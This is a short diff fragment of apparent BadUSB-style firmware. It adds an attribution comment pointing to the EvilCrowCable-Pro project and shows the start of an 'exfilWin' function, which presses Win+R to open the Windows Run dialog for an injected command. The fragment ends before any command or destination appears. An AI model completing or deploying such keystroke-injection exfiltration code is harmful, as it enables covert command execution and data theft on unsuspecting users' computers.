@@ -1,3 +1,5 @@
+// based on https://github.com/joelsernamoreno/EvilCrowCable-Pro/tree/main/firmware, edited by @kaliiiiiiiiii
+
 void exfilWin(char *SomeCommand){
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
